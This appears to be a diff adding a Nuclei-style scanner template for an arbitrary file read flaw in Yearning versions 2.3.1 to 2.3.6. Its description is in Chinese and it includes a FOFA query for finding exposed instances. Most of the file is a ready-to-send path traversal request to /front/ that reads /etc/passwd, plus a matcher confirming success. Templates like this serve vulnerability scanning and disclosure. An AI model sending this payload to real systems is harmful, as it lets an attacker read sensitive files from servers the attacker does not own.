@@ -1,0 +1,28 @@
+id: yearning-front-arbitrary-file-read
+
+info:
+  name: "Yearning Frontend 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="Yearning"
+        Yearning 2.3.1 版本、Interstellar GA 2.3.2 版本 和 Neptune 2.3.4 - 2.3.6 版本由于文件读取机制存在缺陷，导致攻击者可通过构造特定请求读取任意文件内容，从而获取系统敏感数据。
+  tags: Yearning
+
+http:
+- raw:
+  - |
+    GET /front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
